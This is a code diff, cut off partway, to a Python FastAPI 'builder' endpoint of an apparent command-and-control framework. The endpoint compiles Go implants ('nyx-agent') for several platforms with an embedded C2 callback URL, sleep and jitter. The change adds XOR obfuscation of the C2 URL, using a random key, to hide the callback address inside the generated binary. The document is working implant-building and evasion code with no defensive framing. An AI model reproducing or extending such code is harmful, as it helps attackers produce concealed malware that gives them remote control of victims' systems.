@@ -1,7 +1,8 @@
-import os, subprocess, tempfile, shutil
+import os, subprocess, tempfile, shutil, secrets
 from fastapi import APIRouter, HTTPException, Depends
 from fastapi.responses import FileResponse
 from pydantic import BaseModel
+from typing import Optional
 from core.auth import get_current_operator
 
 router = APIRouter(prefix="/api/builder", tags=["builder"])
@@ -16,15 +17,27 @@ PLATFORMS = {
     "windows-amd64": {"GOOS": "windows", "GOARCH": "amd64",  "ext": ".exe"},
 }
 
+
+def xor_encode_hex(text: str, key: str) -> str:
+    """XOR-encodes a string with key, returns hex string."""
+    out = []
+    for i, ch in enumerate(text.encode()):
+        out.append(f"{ch ^ ord(key[i % len(key)]):02x}")
+    return "".join(out)
+
+
 class BuildRequest(BaseModel):
     c2_url: str
     platform: str
     sleep: int = 5
     jitter: int = 1
+    obfuscate: bool = False   # XOR-obfuscate C2 URL in binary
+
 
 @router.get("/platforms")
 def list_platforms(_: str = Depends(get_current_operator)):
     return list(PLATFORMS.keys())
+
 
 @router.post("/build")
 def build_agent(req: BuildRequest, _: str = Depends(get_current_operator)):
@@ -33,22 +46,33 @@ def build_agent(req: BuildRequest, _: str = Depends(get_current_operator)):
 
     p = PLATFORMS[req.platform]
     ext = p["ext"]
-    out_name = f"nyx-agent-{req.platform}{ext}"
+    obf_suffix = "-obf" if req.obfuscate else ""
+    out_name = f"nyx-agent-{req.platform}{obf_suffix}{ext}"
 
     tmp_dir = tempfile.mkdtemp()
     out_path = os.path.join(tmp_dir, out_name)
 
     env = os.environ.copy()
-    env["GOOS"]    = p["GOOS"]
-    env["GOARCH"]  = p["GOARCH"]
-    env["CGO_ENABLED"] = "0"
-    env["PATH"]    = env.get("PATH", "") + ":/opt/homebrew/bin:/usr/local/go/bin"
+    env["GOOS"]         = p["GOOS"]
+    env["GOARCH"]       = p["GOARCH"]
+    env["CGO_ENABLED"]  = "0"
+    env["PATH"]         = env.get("PATH", "") + ":/opt/homebrew/bin:/usr/local/go/bin"
+
+    if req.obfuscate:
+        xor_key = secrets.token_hex(4)          # 8-char random hex key
+        encoded_url = xor_encode_hex(req.c2_url, xor_key)
+        url_var = encoded_url
+        key_var = xor_key
+    else:
+        url_var = req.c2_url
+        key_var = ""
 
     ldflags = (
-        f'-s -w '
-        f'-X main.C2URL={req.c2_url} '
-        f'-X main.DefaultSleep={req.sleep} '
-        f'-X main.DefaultJitter={req.jitter}'
+        f"-s -w "
+        f"-X main.C2URL={url_var} "
+        f"-X main.XORKey={key_var} "
+        f"-X main.DefaultSleep={req.sleep} "
+        f"-X main.DefaultJitter={req.jitter}"
     )
 
     result = subprocess.run(
